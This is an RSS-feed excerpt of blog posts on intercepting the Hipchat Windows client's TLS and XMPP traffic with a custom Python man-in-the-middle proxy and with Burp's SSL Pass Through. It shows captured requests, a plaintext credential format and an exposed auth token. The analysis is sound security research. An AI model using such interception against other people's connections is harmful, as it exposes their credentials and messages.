&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat3/11-It-works.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;If you run the proxy, you will see that after the connection is made, server starts sending the whole address book and any messages in all available chatrooms (even if you are not logged into them), after the initial barrage of data from the server, the rest will be mild unless you are in very crowded chatrooms.&lt;/p&gt;

&lt;p&gt;The proxy is also slow as it is printing everything to console, I have a different version of it that dumps the traffic to text files named &lt;code&gt;HipProxy-filedump.py&lt;/code&gt;. This is a lot faster and allows us to look at the traffic offline. There will be three (almost) text files &lt;code&gt;everything.dump&lt;/code&gt;, &lt;code&gt;fromclient.dump&lt;/code&gt; and &lt;code&gt;fromserver.dump&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&#34;6-1-connection-juggling:6f44788618f3174bd28bf25248bb8608&#34;&gt;6.1 Connection Juggling&lt;/h4&gt;

&lt;p&gt;As you saw, I juggled the TLS connections. After both TCP connections were converted to TLS (did you see how easy it was to do it in Python?) both client and server sockets were converted to non-blocking and their timeouts set to 0.5 seconds. At any given time, one socket is receiving and the other is sending. Each socket will send/receive for half a second before timing out and raising an exception (because they non-blocking). Then I caught these exceptions and checked if the exception text contained “timed out.” If this occurs we have not encountered any problems and keep juggling. This method not optimal but is a pretty simple concept and works. We are not transferring large chunks of data and only have two connections.&lt;/p&gt;

&lt;h4 id=&#34;6-2-notes-about-the-python-code:6f44788618f3174bd28bf25248bb8608&#34;&gt;6.2 Notes about the Python Code&lt;/h4&gt;

&lt;p&gt;It was really easy, it took me more time to write the blogs (creating good capture files to explain how Burp works took a long time) than to actually do the technical part. Without comments the proxy is less than 50 lines in Python (43 lines to be exact including the file logging lines) so now you know why we use scripting languages. I assume it is going to be as easy in Ruby and whatever Perl is :).&lt;/p&gt;

&lt;p&gt;You could say this is not good Python code, fortunately I am not a dev. It does not check for errors, it is not modular and does not work for other programs. But it works for Hipchat and does the job. My main objective was to write to show and explain how a MitM proxy works. With a few hacky modifications you can even inject traffic (I will do it one day).&lt;/p&gt;

&lt;h3 id=&#34;7-some-interesting-items:6f44788618f3174bd28bf25248bb8608&#34;&gt;7. Some Interesting Items&lt;/h3&gt;

&lt;p&gt;I will probably revisit the proxy later and start analyzing Hipchat’s traffic (which is basically XMPP) and modify the proxy to inject traffic. Here are some interesting things that I noted in my cursory look:&lt;/p&gt;

&lt;h4 id=&#34;7-1-auth:6f44788618f3174bd28bf25248bb8608&#34;&gt;7.1 Auth&lt;/h4&gt;

&lt;p&gt;Open the file fromclient.dump and look at the data sent by the client. The second message is the auth message and is in the following form:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;auth&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;http://hipchat.com&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;gt;&lt;/span&gt;some base64 data&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/auth&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If you decode this base64 blob you can see the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;0x00username0x00Password0x00windows
&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&#34;7-2-ian-ate-the-hash:6f44788618f3174bd28bf25248bb8608&#34;&gt;7.2 Ian Ate the Hash&lt;/h4&gt;

&lt;p&gt;XMPP supports using hash functions for integrity checks but in Hipchat we see the value of hash function is set to &lt;code&gt;IANWASHERE&lt;/code&gt;. In a normal XMPP message, it contains the name of a hash function and there is a base64 encoded hash (of something):&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# Hipchat message
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;presence&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;c&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;http://jabber.org/protocol/caps&amp;quot;&lt;/span&gt;
     &lt;span style=&#34;color: #93A1A1&#34;&gt;hash=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;IANWASHERE&amp;quot;&lt;/span&gt;
     &lt;span style=&#34;color: #93A1A1&#34;&gt;node=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;http://hipchat.com/client/qt/windows&amp;quot;&lt;/span&gt;
     &lt;span style=&#34;color: #93A1A1&#34;&gt;ver=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;2.2.1395&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;os_ver=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Windows 7&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/presence&amp;gt;&lt;/span&gt;

# normal XMPP message
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;presence&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;from=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;romeo@montague.lit/orchard&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;c&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;http://jabber.org/protocol/caps&amp;#39;&lt;/span&gt; 
     &lt;span style=&#34;color: #93A1A1&#34;&gt;hash=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;sha-1&amp;#39;&lt;/span&gt;
     &lt;span style=&#34;color: #93A1A1&#34;&gt;node=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;http://code.google.com/p/exodus&amp;#39;&lt;/span&gt;
     &lt;span style=&#34;color: #93A1A1&#34;&gt;ver=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;QgayPKawpkPSDYmwT/WM94uAlu0=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/presence&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&#34;7-3-server-s-data-dump-at-startup:6f44788618f3174bd28bf25248bb8608&#34;&gt;7.3 Server’s Data Dump at Startup&lt;/h4&gt;

&lt;p&gt;If you look at the data coming from server, you can see that the server sends the address book (everyone’s information) after establishing the connection. We can also see all messages in all accessible chatrooms being downloaded (although I was not logged into any chatroom) perhaps for caching purposes. This is why the connection is so slow at start but stabilizes after a while.&lt;/p&gt;

&lt;h4 id=&#34;7-4-cleaning-up:6f44788618f3174bd28bf25248bb8608&#34;&gt;7.4 Cleaning Up&lt;/h4&gt;

&lt;p&gt;Remember to delete the data dumps as they contain your username and password in plaintext. Also remember to remove the root certificate from Windows’ certificate store.&lt;/p&gt;

&lt;p&gt;Ok, that was all folks. I hope this is useful, I mean it is. Sooner or later you have to write your own proxy. As usual if you have any complaints, you know where to find me, feedback is always welcome.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Proxying Hipchat Part 2: So You Think You Can Use Burp?</title>
      <link>http://parsiya.net/blog/2015-10-09-Proxying-Hipchat-Part-2-So-You-Think-You-Can-Use-Burp/</link>
      <pubDate>Fri, 09 Oct 2015 22:34:37 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2015-10-09-Proxying-Hipchat-Part-2-So-You-Think-You-Can-Use-Burp/</guid>
      <description>

&lt;p&gt;In &lt;a href=&#34;http://parsiya.net/blog/2015-10-08-Proxying-Hipchat-Part-1-Where-did-the-Traffic-Go/&#34; title=&#34;Proxying Hipchat Part 1: Where did the Traffic Go?&#34; target=&#34;_blank&#34;&gt;&lt;strong&gt;part1&lt;/strong&gt;&lt;/a&gt; I talked about identifying Hipchat endpoints and promised to discuss proxying the application. In this post I will show how to proxy &lt;em&gt;some&lt;/em&gt; of Hipchat’s traffic using Burp.&lt;/p&gt;

&lt;p&gt;This is specific to Hipchat client for Windows. The current version at the time of writing was is &lt;strong&gt;2.2.1361&lt;/strong&gt;. Atlassian is skipping version 3 and version 4 still in beta.&lt;/p&gt;

&lt;h3 id=&#34;1-ez-mode-proxy-settings:4e05e28f6fdfa8cb6420fb7940d5416d&#34;&gt;1. EZ-Mode Proxy Settings&lt;/h3&gt;

&lt;p&gt;To see the proxy settings, log off and select Configure Connection. Note that in the most recent version (2.2.1395) this added to the settings menu inside the application and there is no need to logoff.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/01-Hipchat-login-screen.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Yay for proxy settings. So you think you can use Burp? It’s not going to be that easy, otherwise why would I been writing this?&lt;/p&gt;

&lt;p&gt;My Burp proxy is listening on &lt;code&gt;127.0.0.1:8080&lt;/code&gt; so I will add it as proxy.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/02-Hipchat-proxy-settings.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;You can also enable proxy settings by modifying the &lt;code&gt;%appdata%\Atlassian\Hipchat.ini&lt;/code&gt; file (on Windows). We need to modify these settings:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;httpHostname=localhost
httpPort=8080
proxyType=Http
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now login. We will see some requests in Burp. We have seen them before, first one is the &lt;code&gt;Latest News&lt;/code&gt; and the second one is the emoticon associated with it. The emoticon is loaded over HTTPs while latest news is loaded over HTTP. We will play with it later.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1. http://downloads.hipchat.com/blog_info.html
# section 2.2 in part 1

2. https://s3.amazonaws.com/uploads.hipchat.com/10804/368466/FM3tGM05hUCySVj/freddie.png 
# emoticon in this case it is Freddie Mercury
# note that this changes because last time I saw success kid
# section 2.3 in part 1.

3.&amp;lt;?xml version=&amp;#39;1.0&amp;#39;?&amp;gt;&amp;lt;stream:stream to=&amp;#39;chat.hipchat.com&amp;#39;
# looks like the start of an XMPP handshake.
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Note: &lt;code&gt;hipchatserver.com&lt;/code&gt;, our imaginary Hipchat server&amp;rsquo;s IP is &lt;code&gt;10.11.1.25&lt;/code&gt; in this post.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/03-Initial-requests-in-Burp.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;The third request looks like the start of an XMPP handshake which has been cut off by Burp. It should be something like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;?xml version=&amp;#39;1.0&amp;#39;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;stream:stream&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;to=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;chat.hipchat.com&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;jabber:client&amp;#39;&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns:stream=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;http://etherx.jabber.org/streams&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;version=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;1.0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&#34;2-why-did-burp-burp:4e05e28f6fdfa8cb6420fb7940d5416d&#34;&gt;2. Why did Burp, Burp?&lt;/h3&gt;

&lt;p&gt;To diagnose the problem, we must look at the traffic capture. Run Netmon and login to Hipchat again. Remember that you cannot capture Hipchat’s traffic to Burp with Netmon or Wireshark as it is local (from &lt;code&gt;127.0.0.1:49xxx&lt;/code&gt; to &lt;code&gt;127.0.0.1:8080&lt;/code&gt;) so you need to sniff local traffic with something like &lt;a href=&#34;http://www.netresec.com/?page=RawCap&#34; target=&#34;_blank&#34;&gt;RawCap&lt;/a&gt;. But we can look at Burp’s outbound traffic in Netmon. Look for traffic belonging to the &lt;code&gt;javaw.exe&lt;/code&gt; process (for Burp).&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/04-Traffic-to-hipchat.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Or using sequence diagram created on &lt;a href=&#34;https://www.websequencediagrams.com&#34; target=&#34;_blank&#34;&gt;https://www.websequencediagrams.com&lt;/a&gt;. We have a bunch of internal licenses for this at Cigital so I have started adding sequence diagrams to all of my blog posts and reports :D.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/05-Failed-XMPP-Handshake.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;As we see the XMPP handshake is incomplete. In short, Burp somehow messes up the first part of the XMPP handshake and drops the packet just after it sees &lt;code&gt;to=&#39;chat.hipchat.com&#39;&lt;/code&gt; and sends an incomplete payload which causes the server to reject it and reset the connection.&lt;/p&gt;

&lt;h3 id=&#34;3-burp-s-ssl-pass-through:4e05e28f6fdfa8cb6420fb7940d5416d&#34;&gt;3. Burp’s SSL Pass Through&lt;/h3&gt;

&lt;p&gt;It’s time to talk about another one of Burp’s capabilities. This one is named &lt;code&gt;SSL Pass Through&lt;/code&gt; and is very useful for exactly the situation we are in. We can specify endpoints (domain/IP and port) and tell Burp not to mess with the to/from those points and just pass it through as it is. This means that Burp will not Man-in-the-Middle (MitM) the connection and just ignore the traffic. It is located at &lt;code&gt;Proxy &amp;gt; Option &amp;gt; SSL Pass Through&lt;/code&gt; (scroll all the way to the bottom). Let’s tell Burp not to proxy anything to/from the &lt;code&gt;hipchatserver.com&lt;/code&gt; at &lt;code&gt;10.11.1.25:5222&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/06-SSL-Pass-Through.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;And yay!&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/07-Hipchat-logged-in-with-Burp-as-proxy.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Now let’s take a look at these requests. We have already seen the first two before.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1. GET: http://downloads.hipchat.com/blog_info.html
2. GET: https://s3.amazonaws.com/uploads.hipchat.com/10804/368466/FM3tGM05hUCySVj/freddie.png
3. GET: https://www.hipchat.com/img/silhouette_125.png
4. GET: https://hipchat.com/release_notes/appcast/qtwindows?auth-uid=351&amp;amp;auth-token=JHAgpsxHVva3SMC
5. GET: https://www.hipchat.com/release_notes/appcast/qtwindows?auth-uid=351&amp;amp;auth-token=JHAgpsxHVva3SMC
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Request number 3&lt;/strong&gt; is retrieving an image. It is the placeholder image for profile pictures in Hipchat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GET&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/img/silhouette_125.png&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1.1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Connection&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Keep-Alive&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;gzip, deflate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Language&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;en-US,*&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Mozilla/5.0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;www.hipchat.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/08-Profile-pic-placeholder.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Why are we retrieving this image from hipchat.com every time when it can be stored in the application and conserve bandwidth? I don’t know but Paranoid Parsia tells me that it is an Atlassian tracking request. This way they will know where and when an instance has been executed. There is no identifying data sent with the request.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/09-I-am-not-saying-it-was-Atlassian-but-it-was-Atlassian.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;&lt;strong&gt;Request 4&lt;/strong&gt; is another GET request.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GET&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/release_notes/appcast/qtwindows?auth-uid=351&amp;amp;auth-token=JHAgpsxHVva3SMC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1.1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Cache-Control&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;no-cache&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Pragma&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;no-cache&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Connection&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Keep-Alive&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;gzip, deflate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Language&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;en-US,*&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Mozilla/5.0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hipchat.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;But it gets redirected to &lt;a href=&#34;https://www.hipchat.com/release_notes/appcast/qtwindows?auth-uid=351&amp;amp;auth-token=JHAgpsxHVva3SMC&#34; target=&#34;_blank&#34;&gt;https://www.hipchat.com/release_notes/appcast/qtwindows?auth-uid=351&amp;amp;auth-token=JHAgpsxHVva3SMC&lt;/a&gt;. Remember when we saw the application communicating with both &lt;code&gt;hipchat.com&lt;/code&gt; and &lt;code&gt;www.hipchat.com&lt;/code&gt; (sections 2.4 and 2.5 of &lt;a href=&#34;hipchat-part1&#34; target=&#34;_blank&#34;&gt;part 1&lt;/a&gt;)? This is it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;HTTP/1.1 301 Moved Permanently
Cache-control: no-cache=&amp;quot;set-cookie&amp;quot;
Content-Type: text/html
Date: Mon, 07 Sep 2015 22:41:37 GMT
Location: https://www.hipchat.com/release_notes/appcast/qtwindows?auth-uid=351&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;amp;&lt;/span&gt;auth-token=JHAgpsxHVva3SMC
Server: nginx
Set-Cookie: AWSELB=05C1D11310299FE142D714774ABD93C5B09ED1734381C4F7DC691A8BCC5031E618740E2045508C8D72C034DD48A74BD4A2E439469DEA3BD63B536161358959E4151A965466;PATH=/
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 178
Connection: keep-alive

Response:
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;301 Moved Permanently&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;body&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;bgcolor=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;white&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;301 Moved Permanently&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;&lt;/span&gt;nginx&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Which results in &lt;strong&gt;request 5&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GET&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/release_notes/appcast/qtwindows?auth-uid=351&amp;amp;auth-token=JHAgpsxHVva3SMC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1.1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Cache-Control&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;no-cache&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Pragma&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;no-cache&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Connection&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Keep-Alive&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;gzip, deflate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Language&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;en-US,*&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Mozilla/5.0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;www.hipchat.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Response to request 5 is an RSS feed containing release versions of the Hipchat client for Windows. Click this link if you want to see it in action &lt;a href=&#34;https://www.hipchat.com/release_notes/appcast/qtwindows&#34; target=&#34;_blank&#34;&gt;https://www.hipchat.com/release_notes/appcast/qtwindows&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;HTTP/1.1 200 OK
Cache-control: no-cache=&amp;quot;set-cookie&amp;quot;
Content-Type: application/xml
Date: Mon, 07 Sep 2015 22:41:38 GMT
Server: nginx
Set-Cookie: AWSELB=05C1D11310299FE142D714774ABD93C5B09ED1734381C4F7DC691A8BCC5031E618740E204546FF579CEC855051CA268C2FEED4240DD3110178C6BD0BB2D00F1E409F9F4DA6;PATH=/
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 21562
Connection: keep-alive

